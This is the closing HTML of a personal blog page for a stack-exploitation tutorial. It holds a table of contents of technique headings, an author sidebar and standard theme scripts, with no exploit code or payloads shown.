+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn-Stack-based-attack"><span class="toc-number">1.</span> <span class="toc-text">Pwn-Stack based attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E7%94%A8%E7%9A%84debug%E7%92%B0%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">我用的debug環境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-Pwn"><span class="toc-number">1.2.</span> <span class="toc-text">What is Pwn?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-target"><span class="toc-number">1.3.</span> <span class="toc-text">pwn target</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#memory"><span class="toc-number">1.4.</span> <span class="toc-text">memory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Text"><span class="toc-number">1.4.1.</span> <span class="toc-text">Text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Data"><span class="toc-number">1.4.2.</span> <span class="toc-text">Data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BSS"><span class="toc-number">1.4.3.</span> <span class="toc-text">BSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Heap"><span class="toc-number">1.4.4.</span> <span class="toc-text">Heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack"><span class="toc-number">1.4.5.</span> <span class="toc-text">stack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E8%AD%B7%E6%A9%9F%E5%88%B6"><span class="toc-number">1.5.</span> <span class="toc-text">保護機制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RELRO-ReLocation-Read-Only"><span class="toc-number">1.5.1.</span> <span class="toc-text">RELRO(ReLocation Read-Only)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack-canary"><span class="toc-number">1.5.2.</span> <span class="toc-text">stack canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NX"><span class="toc-number">1.5.3.</span> <span class="toc-text">NX</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PIE"><span class="toc-number">1.5.4.</span> <span class="toc-text">PIE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASLR"><span class="toc-number">1.5.5.</span> <span class="toc-text">ASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#seccomp"><span class="toc-number">1.5.6.</span> <span class="toc-text">seccomp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#register"><span class="toc-number">1.6.</span> <span class="toc-text">register</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oob"><span class="toc-number">1.7.</span> <span class="toc-text">oob</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#int-overflow"><span class="toc-number">1.8.</span> <span class="toc-text">int overflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#partial-overwrite"><span class="toc-number">1.9.</span> <span class="toc-text">partial overwrite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack-%E5%A0%86%E7%96%8A"><span class="toc-number">1.10.</span> <span class="toc-text">stack(堆疊)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#old-rbp"><span class="toc-number">1.10.1.</span> <span class="toc-text">old rbp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack-return-address"><span class="toc-number">1.10.2.</span> <span class="toc-text">stack return address</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#buffer-ovweflow"><span class="toc-number">1.11.</span> <span class="toc-text">buffer ovweflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#return2code"><span class="toc-number">1.11.1.</span> <span class="toc-text">return2code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">1.11.2.</span> <span class="toc-text">ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#orw"><span class="toc-number">1.11.2.1.</span> <span class="toc-text">orw</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mprotect"><span class="toc-number">1.11.2.2.</span> <span class="toc-text">mprotect</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP"><span class="toc-number">1.12.</span> <span class="toc-text">ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gadget"><span class="toc-number">1.12.1.</span> <span class="toc-text">gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP-chain"><span class="toc-number">1.12.2.</span> <span class="toc-text">ROP chain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%8C%E7%9B%AE"><span class="toc-number">1.12.2.1.</span> <span class="toc-text">題目</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack-migration"><span class="toc-number">1.13.</span> <span class="toc-text">stack migration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fixed-Size-Migration"><span class="toc-number">1.14.</span> <span class="toc-text">Fixed Size Migration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#libc-%E7%9B%B8%E9%97%9C"><span class="toc-number">1.15.</span> <span class="toc-text">libc 相關</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#libc%E6%98%AF%E5%95%A5"><span class="toc-number">1.15.1.</span> <span class="toc-text">libc是啥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#static"><span class="toc-number">1.15.2.</span> <span class="toc-text">static</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#demo"><span class="toc-number">1.15.2.1.</span> <span class="toc-text">demo</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dynamic"><span class="toc-number">1.15.3.</span> <span class="toc-text">dynamic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GOT%EF%BC%88global-offset-table%EF%BC%89"><span class="toc-number">1.15.4.</span> <span class="toc-text">GOT（global offset table）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PLT-procedure-linkage-table"><span class="toc-number">1.16.</span> <span class="toc-text">PLT(procedure linkage table)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dynamic-link"><span class="toc-number">1.16.1.</span> <span class="toc-text">dynamic link</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GOT-hijack"><span class="toc-number">1.17.</span> <span class="toc-text">GOT hijack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#demo-1"><span class="toc-number">1.17.1.</span> <span class="toc-text">demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.17.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#script"><span class="toc-number">1.17.3.</span> <span class="toc-text">script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc"><span class="toc-number">1.18.</span> <span class="toc-text">ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%97libc-base"><span class="toc-number">1.18.1.</span> <span class="toc-text">算libc base</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#demo-2"><span class="toc-number">1.18.2.</span> <span class="toc-text">demo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2csu"><span class="toc-number">1.19.</span> <span class="toc-text">ret2csu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#srop"><span class="toc-number">1.20.</span> <span class="toc-text">srop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2-dl-runtime-resolve"><span class="toc-number">1.21.</span> <span class="toc-text">ret2 dl_runtime_resolve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A4%87%E7%BF%92%E4%B8%80%E4%B8%8BGOT"><span class="toc-number">1.21.1.</span> <span class="toc-text">複習一下GOT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%BDgdb"><span class="toc-number">1.21.2.</span> <span class="toc-text">追gdb</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#env"><span class="toc-number">1.21.2.1.</span> <span class="toc-text">env</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fixup%E8%A9%B3%E7%B4%B0%E5%B1%95%E9%96%8B"><span class="toc-number">1.21.3.</span> <span class="toc-text">fixup詳細展開</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-64-bits-NO-RELRO"><span class="toc-number">1.21.4.</span> <span class="toc-text">利用 64 bits NO RELRO</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2vdso"><span class="toc-number">1.22.</span> <span class="toc-text">ret2vdso</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#memory-segment"><span class="toc-number">1.22.1.</span> <span class="toc-text">memory segment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vdso-ASLR"><span class="toc-number">1.22.2.</span> <span class="toc-text">vdso ASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reference"><span class="toc-number">1.22.3.</span> <span class="toc-text">reference</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#One-gadget"><span class="toc-number">1.23.</span> <span class="toc-text">One gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#demo-3"><span class="toc-number">1.23.1.</span> <span class="toc-text">demo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#init-array-fini-array-hijack"><span class="toc-number">1.24.</span> <span class="toc-text">.init_array &amp; .fini_array hijack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TLS-bypass-canary"><span class="toc-number">1.25.</span> <span class="toc-text">TLS bypass canary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TLS-Thread-Local-Storage"><span class="toc-number">1.25.1.</span> <span class="toc-text">TLS(Thread Local Storage)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TLS%E8%AA%A4%E5%8D%80"><span class="toc-number">1.25.2.</span> <span class="toc-text">TLS誤區</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TLS%E7%94%A8%E9%80%94"><span class="toc-number">1.25.3.</span> <span class="toc-text">TLS用途</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TLS-canary"><span class="toc-number">1.25.4.</span> <span class="toc-text">TLS &amp; canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#struct"><span class="toc-number">1.25.5.</span> <span class="toc-text">struct</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TLScanary%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B"><span class="toc-number">1.25.6.</span> <span class="toc-text">TLScanary攻擊流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%8C%E7%9B%AE-1"><span class="toc-number">1.25.7.</span> <span class="toc-text">題目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#format-string"><span class="toc-number">1.26.</span> <span class="toc-text">format string</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%93%AA%E4%BA%9Bformat-string"><span class="toc-number">1.26.1.</span> <span class="toc-text">有哪些format string</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%80%E5%8F%96"><span class="toc-number">1.27.</span> <span class="toc-text">讀取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%AB%E5%85%A5"><span class="toc-number">1.28.</span> <span class="toc-text">寫入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#n"><span class="toc-number">1.28.1.</span> <span class="toc-text">%n</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%AB%E5%85%A5%E5%AD%97%E5%85%83%E6%95%B8"><span class="toc-number">1.28.2.</span> <span class="toc-text">寫入字元數</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c"><span class="toc-number">1.28.3.</span> <span class="toc-text">%c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%88%89%E4%BE%8B"><span class="toc-number">1.28.4.</span> <span class="toc-text">舉例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#argv-chain"><span class="toc-number">1.29.</span> <span class="toc-text">argv chain</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%88%89%E4%BE%8B-1"><span class="toc-number">1.29.1.</span> <span class="toc-text">舉例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%96%8B%E5%A7%8B%E6%A7%8B%E9%80%A0"><span class="toc-number">1.29.2.</span> <span class="toc-text">開始構造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSP-Stack-Smashing-Protect-leak"><span class="toc-number">1.30.</span> <span class="toc-text">SSP(Stack Smashing Protect) leak</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">57</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Naup堇姬",
+          title: "Pwn-Stack-based-attack",
+          url: "http://example.com/2025/01/20/Pwn-Stack-based-attack/",
+          excerpt: "",
+          description: "",
+          stripContent: "Pwn-Stack based attack Author:堇姬  我用的debug環境 Pwndbg+pwngdb r2 IDA or Ghidra local debug12345tmuxcontext.log_level = &amp;#x27;debug&amp;#x27;context.terminal = [&amp;#x27;tmux&amp;#x27;, &amp;#x27;splitw&amp;#x27;, &amp;#x27;-h&amp;#x27;]gdb.attach(r)  What is Pwn?二進制程式檔滲透，其實就是找尋程式",
+          date: "Mon Jan 20 2025 07:46:24 GMT+0800",
+          updated: "Mon Jan 20 2025 19:48:37 GMT+0800",
+          cover: "/images/posts_cover/HITCON-CTF-Final-2024/HITCON-CTF-Final-2024.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+  </body>
+  </html>
+
